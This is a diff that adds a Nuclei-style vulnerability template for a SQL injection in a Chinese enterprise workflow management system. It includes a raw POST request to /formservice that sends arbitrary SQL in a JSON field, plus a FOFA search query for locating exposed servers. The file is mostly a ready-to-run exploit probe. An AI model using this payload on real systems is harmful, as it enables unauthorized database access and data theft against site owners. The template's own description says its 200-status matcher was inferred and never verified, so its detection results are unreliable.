@@ -1,0 +1,38 @@
+id: poc-lu5r2ga61akgvmqa
+info:
+  name: 时空智友企业流程化管控系统formservice存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lu5r2ga61akgvmqa
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lu5r2ga61akgvmqa
+    fofa: body="企业流程化管控系统" && body="密码(Password):"
+http:
+- raw:
+  - 'POST /formservice?service=workflow.sqlResult HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+
+    Connection: keep-alive
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip
+
+    Content-Length: 50
+
+
+    {"params":{"a":"11"},"sql":"select @@version"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
